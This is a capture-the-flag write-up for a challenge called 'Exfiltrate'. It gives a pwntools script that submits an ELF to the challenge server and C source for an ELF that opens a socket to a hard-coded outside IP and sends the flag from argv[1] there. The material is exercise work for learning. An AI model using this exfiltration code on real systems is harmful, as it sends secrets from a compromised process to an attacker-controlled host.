# Exfiltrate
The binary reads in data from standard in, then executes it like it's an ELF. However, it closes all the file
descriptors so you can't just print the flag.  Make an ELF using your prefered language, and have it send the flag
(located in argv[1]) to a remote server you control. There are free webhook websites if you don't have a server to use.

Python script to send the ELF
```python
from pwn import *

p = remote('ctf.isss.io',5000)
with open('sol','rb') as file:
    stuff = file.read()
    print(str(len(stuff)))
    p.send(stuff)
    #p.shutdown('send')
    p.stream()
```

The ELF itself
```c
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(int argc, char** argv) {
    int sock = socket(AF_INET,SOCK_STREAM,0);
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(12213);
    // a linux server I use, you could use a free webhook online instead
    server_addr.sin_addr.s_addr = inet_addr("73.232.225.55");
    connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
    send(sock, argv[1], strlen(argv[1]), 0);
    close(sock);
    return 0;
}
```
